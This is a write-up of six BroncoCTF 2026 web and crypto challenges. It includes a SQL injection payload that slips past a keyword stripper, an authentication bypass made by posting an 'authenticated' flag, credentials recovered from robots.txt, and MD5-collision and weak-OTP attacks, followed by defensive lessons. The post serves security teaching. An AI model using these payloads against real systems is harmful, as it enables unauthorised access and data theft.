BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Santa Clara University's Cyber Security Club (the "Broncos"). The 2026 edition ran categories including beginner, crypto, forensics, misc, pwn, reverse, and web, with challenges from 10 points (easy warmups) up to a few hundred points (harder chains). Flag format: `bronco{...}`. This writeup covers four web challenges (Forbidden Archives, Lovely Login, Super Secure Server, Unblur Me) and two crypto challenges (Blorg Multiplier, Probably Unbreakable) I solved. The paired pwn + reverse writeup is at [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/). Per-challenge READMEs and solver scripts are at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026).

### How does the Forbidden Archives SQL injection bypass the keyword-stripping WAF?

A single-quote probe reflects the exception `The ink smears: unrecognized token: "') AND is_secret = 0 LIMIT 1"`, which tells us the input is inside a `LIKE ('%...%')` pattern and the app appends `AND is_secret = 0 LIMIT 1` as a visibility filter. Probing further with `' ORDER BY 1 --` returns `near "DER": syntax error`: `ORDER` became `DER` because the app strips the literal substring `OR` before running the query. Same for `UNION`. But `AND` is untouched. Payload: `%') AND is_secret=1 --`. Substituted: `SELECT ... WHERE title LIKE ('%%') AND is_secret=1 -- %') AND is_secret = 0 LIMIT 1`. `%%` matches any title, `is_secret=1` restricts to forbidden rows, `--` comments out the trailing filter. Neither `OR` nor `UNION` appears, so the keyword stripper passes.

### What leaks are in the Lovely Login `robots.txt`?

Two independent leaks in a four-line file. `Disallow: /security` points at a leftover dev page that says "Passwords are derived from usernames" and "Current implementation stores them backwards for obfuscation" plus a `TODO: remove this page before production deployment`. So `password = reverse(username)`. And the comment `# amVmZixzYXJhaCxhZG1pbixndWVzdA==` base64-decodes to `jeff,sarah,admin,guest`. All four credentials authenticate; only `admin:nimda` returns the flag body (the other three return a welcome message plus a GIF). The prompt's "please follow my wishes and do not scrape it..." was pointing directly at `robots.txt`.

### What are the two bugs in Super Secure Server and which one is stronger?

Bug #1: `/api/config` returns `{"username":"SuperSecretUser","password":"..."}` in plaintext JSON to any anonymous caller, because the browser needs the credentials for a client-side password compare. Bug #2: `/login` accepts a POST body of `{"authenticated": true}` with no credentials, signs a Flask session cookie with `{"loggedin":true, "username":"SuperSecretUser"}`, and returns `{"redirect":"/flag","success":true}`. Bug #2 is strictly stronger: it doesn't need `/api/config` to exist, doesn't need you to know the username, and directly demonstrates CWE-306 (missing authentication for critical function). The flag body (`d0nt_3xp0se_p@ssw0rd5`) calls out bug #1, but bug #2 is the scarier one because it survives any hypothetical "fix" of the credential leak.

### Why is the Unblur Me calculus gate not real access control?

Because the blur is implemented as `filter: blur(20px)` in the page's CSS, and the sharp image bytes are already downloaded to the browser. `loadSecretImage()` fetches `/api/v1/internal/fetch-config-blob` unconditionally on page load, before any derivatives are solved, and paints the result into `<img id="flag-image">`. The 500-derivative counter just clears the CSS filter when it hits 500; it doesn't gate the fetch. Solve via `curl -s -o flag.png https://.../api/v1/internal/fetch-config-blob`: no auth cookie, no browser fingerprint, no counter check. Open the PNG (325 KB, 1648×928) and transcribe. One glyph-recognition trap: the `3` in `M@K3` reads as `E` in the compressed font, so `m@ke` gets rejected before you notice `m@k3`.

### How does the Blorg Multiplier MD5 collision exploit work?

The dispatcher validates commands by `md5(input_bytes).hexdigest() in valid` where `valid` is a set of six hex hashes. Two bugs: the `show` hash is stored uppercase but `hexdigest()` returns lowercase (so `show` never matches), and the `program` command lets a user register any command name and a space-separated command list without re-checking the outer `MAX_EDITS = 3` cap between recursive calls. Weaponise a classic 128-byte MD5 collision pair (`collision_a`, `collision_b`, same MD5 `79054025255fb1a26e4bc422aef54eb4`, different bytes): register `collision_a` as the program name so its MD5 lands in `valid`, then invoke `collision_b` as the last token in the macro. It passes the hash check (same MD5) but fails `user_in == program` (different bytes), so execution falls through to the final `else` branch, which prints the flag if `blorgs == 468`. Reach 468 with the 8-command sequence `increase, decrease, increase, increase, decrease, increase, decrease, none` (only possible inside the program recursion since it exceeds `MAX_EDITS = 3`).

### Why is the Probably Unbreakable OTP broken by its 64-character key alphabet?

The encoder computes `enc = bytes(f ^ k for f, k in zip(flag, key))` where `key = random.choices(keystring, k=len(flag))` and `keystring` is a fixed 64-character alphabet `[a-zA-Z0-9_-]`. If the key bytes were uniform over `0..255`, this would be a real one-time pad and repeat encryptions would leak nothing. But since every key byte is one of 64 specific values, each ciphertext byte turns a candidate plaintext byte `p` into the constraint `c XOR p in keystring`. That's a 64/256 = 25% pass rate per sample; `N` independent samples reduce the candidate set by ~4^N. After ~13 samples each position drops below one expected candidate; 127 samples resolve all 34 flag positions to exactly one candidate each with zero ambiguity.

### Why does the Blorg Multiplier need Latin-1 encoding for the MD5 collision block?

The checker decodes user input as Latin-1 (`bytes_in.decode("latin-1")`) and later re-encodes as Latin-1 (`user_in.encode("latin-1")`) before hashing. Since Latin-1 is a byte-for-byte round-trip for codepoints `0x00..0xff`, each raw collision byte `b` can be sent as Unicode character `chr(b)` at the `input()` prompt. Python reads the UTF-8 stream, and the checker's Latin-1 encode reconstructs the original collision bytes. One byte in the classic collision pair is `0x0d` (`\r`), and Python's `input()` splits on `\n` while preserving `\r` as data, so the standard Wang-Yu-style collision works over the socket without any custom collision generation.

### What's the broader lesson from the BroncoCTF 2026 web + crypto tracks?

Every web challenge is the same class: the server delegates a check to something the client controls (a client-side password compare, a client-supplied `authenticated:true` boolean, a CSS blur filter, a `robots.txt` disallow, a naive substring stripper on user input). And every crypto challenge is a "check the constants" exercise: Probably Unbreakable's 64-char keystring collapses the OTP, Blorg Multiplier's uppercase `show` hash plus MD5-hash-vs-string mismatch inside the `program` recursion routes a collision into the flag branch. Modern defence is uniform: parameterised queries end-to-end, credential comparisons and token issuance server-side, sensitive content not sent to unauthenticated clients, SHA-256 for identity and HMAC-SHA256 for authenticity, and CSPRNG (`secrets.token_bytes`) for key material. The industry keeps re-learning at least one of these per year at scale.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts are at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). Each challenge has a `solve.py` or `solve.sh` that reproduces the flag against a fresh instance (web) or from the handout (crypto). Web solvers use `curl` + a small `grep -Eo 'bronco\{[^}]+\}'` extraction. Blorg Multiplier's solver embeds the classic 128-byte MD5 collision pair as a Python constant, encodes each byte via `chr(b)` for `input()` transit, and streams the sequence over `pwntools` or a raw socket. Probably Unbreakable's solver is a per-position brute force over printable ASCII with a membership test against the keystring; it works offline against `artifacts/ciphertexts.txt` or against a fresh remote instance with `--remote 0.cloud.chals.io 16474 --samples 128`.

## Closing notes

Six challenges tied together by two lessons. On the web side: **the server has to do the security check, not the client**. Forbidden Archives puts a validator client-adjacent (in a keyword stripper that never sees the SQL grammar), Lovely Login puts the credential rule in `robots.txt` and the user list in a base64 comment on the same file, Super Secure Server fetches credentials from `/api/config` for a client-side compare while `/login` blindly trusts `{"authenticated":true}`, Unblur Me implements a 500-question quiz gate with `filter: blur(20px)` on already-downloaded PNG bytes. Every one of them ships in production this decade in different clothes: pre-signed URLs served without expiry checks, JWT signature validation disabled, admin flags read from a client-supplied cookie, blur-then-download image galleries. On the crypto side: **check the constants**. Probably Unbreakable's key alphabet is 64 characters printed in the source; Blorg Multiplier's valid set contains one uppercase entry among six lowercase entries plus a recursion primitive; both give away the attack shape before you write a line of solver code.

For adjacent event content on the site, the [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) walks the same event's native side (seccomp-restricted ORW shellcode, four-gate gets() chain with stack-aligned ret2win, Roblox server-side Lua sandbox with write-over-read-protection, 5-day cat simulator and 6-day dog simulator with FNV-1a Z3 preimage, C++ song-title token substitution, self-referential SHA-256 XOR loop). The [Junior.Crypt 2026 web + crypto writeup](/ctf-writeups/junior-crypt-2026-web-crypto-writeup/) covers a Portuguese-themed newline injection and an HS256 JWT wordlist crack alongside Franklin-Reiter e=3, offline Vaudenay via timing trace, LCG seed truncation, and many-time pad via multiset match. The [Junior.Crypt 2026 forensic + misc + OSINT writeup](/ctf-writeups/junior-crypt-2026-forensic-misc-osint-writeup/) has a pickle supply-chain backdoor with LedgerModel.infer trigger, an SVG clip-path ghost text trick, DOCX customXml revision replay, and a MIDI pitch-wheel steganography channel. The [Junior.Crypt 2026 pwn + reverse writeup](/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) covers native primitives from a different event. The [R3CTF 2026 master writeup](/ctf-writeups/r3ctf-2026-writeup/) covers Microsoft SEAL CKKS delta recovery and .NET xoshiro256** state recovery. The [LYKNCTF web writeup](/ctf-writeups/lyknctf-2026-web-writeup/) covers a Legacy Profile Importer AES-CBC padding oracle. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is BroncoCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Santa Clara University's Cyber Security Club (the 'Broncos'). The 2026 edition ran beginner, crypto, forensics, misc, pwn, reverse, and web categories, with challenges from 10 points up to a few hundred points. Flag format bronco{...}. This writeup covers four web challenges (Forbidden Archives, Lovely Login, Super Secure Server, Unblur Me) and two crypto challenges (Blorg Multiplier, Probably Unbreakable). The paired pwn + reverse writeup is at /ctf-writeups/broncoctf-2026-pwn-reverse-writeup/. Per-challenge READMEs and solvers at github.com/Abdelkad3r/BroncoCTF-2026."}},
    {"@type": "Question","name": "How does the Forbidden Archives SQL injection bypass the keyword-stripping WAF?","acceptedAnswer": {"@type": "Answer","text": "Single-quote probe reflects the exception with the SQL tail: LIKE ('%<search>%') AND is_secret = 0 LIMIT 1. Probing ' ORDER BY 1 -- returns 'near DER: syntax error' because the app strips the literal substring OR. Same for UNION. But AND is untouched. Payload %') AND is_secret=1 -- uses the app's own visibility column and comments out the trailing filter without either banned keyword."}},
    {"@type": "Question","name": "What leaks are in the Lovely Login robots.txt?","acceptedAnswer": {"@type": "Answer","text": "Two independent leaks in a four-line file. Disallow: /security points at a leftover dev page revealing password = reverse(username). The comment amVmZixzYXJhaCxhZG1pbixndWVzdA== base64-decodes to jeff,sarah,admin,guest. All four credentials authenticate; only admin:nimda returns the flag body."}},
    {"@type": "Question","name": "What are the two bugs in Super Secure Server and which one is stronger?","acceptedAnswer": {"@type": "Answer","text": "Bug 1: /api/config returns plaintext JSON credentials to any anonymous caller. Bug 2: /login accepts POST body {authenticated:true} with no credentials, signs a Flask session cookie with {loggedin:true, username:SuperSecretUser}, returns {redirect:/flag, success:true}. Bug 2 is strictly stronger (CWE-306 missing authentication for critical function) since it doesn't need /api/config to exist or you to know the username."}},
    {"@type": "Question","name": "Why is the Unblur Me calculus gate not real access control?","acceptedAnswer": {"@type": "Answer","text": "The blur is implemented as CSS filter: blur(20px) on an <img> element. loadSecretImage() fetches /api/v1/internal/fetch-config-blob unconditionally on page load and paints the sharp PNG into the img. The 500-derivative counter only clears the CSS filter; it doesn't gate the fetch. Curl the endpoint directly for the raw 325 KB PNG; open, transcribe, watch the M@K3 vs M@KE glyph-recognition trap."}},
    {"@type": "Question","name": "How does the Blorg Multiplier MD5 collision exploit work?","acceptedAnswer": {"@type": "Answer","text": "The dispatcher validates commands by md5(input).hexdigest() in valid. Two bugs: show hash is uppercase but hexdigest() returns lowercase (show never matches), and the program command lets a user register any command name plus a recursive command list without re-checking MAX_EDITS between nested calls. Weaponise a classic 128-byte MD5 collision pair: register collision_a as program name; invoke collision_b as the last macro token. Same MD5 passes the hash check, different bytes fail user_in == program, so execution falls through to the flag branch when blorgs == 468. Reach 468 with the 8-command sequence inside the program recursion."}},
    {"@type": "Question","name": "Why is the Probably Unbreakable OTP broken by its 64-character key alphabet?","acceptedAnswer": {"@type": "Answer","text": "If key bytes were uniform over 0..255 the OTP would leak nothing on repeat encryption. But keystring is a 64-character alphabet, so each ciphertext byte turns a candidate plaintext byte p into the constraint (c XOR p) in keystring. 25% pass rate per sample means N samples reduce the candidate set by ~4^N. After 13 samples each position drops below one expected candidate; 127 samples resolve all 34 flag positions to exactly one candidate each."}},
    {"@type": "Question","name": "Why does the Blorg Multiplier need Latin-1 encoding for the MD5 collision block?","acceptedAnswer": {"@type": "Answer","text": "The checker decodes input as Latin-1 (bytes_in.decode('latin-1')) and re-encodes as Latin-1 (user_in.encode('latin-1')) before hashing. Latin-1 is a byte-for-byte round-trip for codepoints 0x00..0xff. Each raw collision byte b is sent as chr(b) at the input() prompt. Python reads the UTF-8, the checker's Latin-1 encode reconstructs the original bytes. One byte in the classic pair is 0x0d; Python input() splits on \\n and preserves \\r as data."}},
    {"@type": "Question","name": "What's the broader lesson from the BroncoCTF 2026 web + crypto tracks?","acceptedAnswer": {"@type": "Answer","text": "Web: the server has to do the security check, not the client. Forbidden Archives runs the validator on a normalised form; Lovely Login puts the credential rule in robots.txt; Super Secure Server fetches credentials from /api/config for a client-side compare and blindly trusts {authenticated:true}; Unblur Me implements a 500-question gate as CSS blur on already-downloaded bytes. Crypto: check the constants. Probably Unbreakable's 64-char keystring and Blorg Multiplier's uppercase show hash both give away the attack shape before you write a solver."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/BroncoCTF-2026. Each challenge has a solve.py or solve.sh reproducing the flag from a fresh instance (web) or handout (crypto). Web solvers use curl and a small grep extraction. Blorg Multiplier embeds the classic 128-byte MD5 collision pair as a Python constant and encodes each byte via chr(b) for input() transit. Probably Unbreakable's solver is a per-position brute force with a membership test against the keystring; works offline against artifacts/ciphertexts.txt or with --remote against a fresh instance."}}
  ]
}
</script>
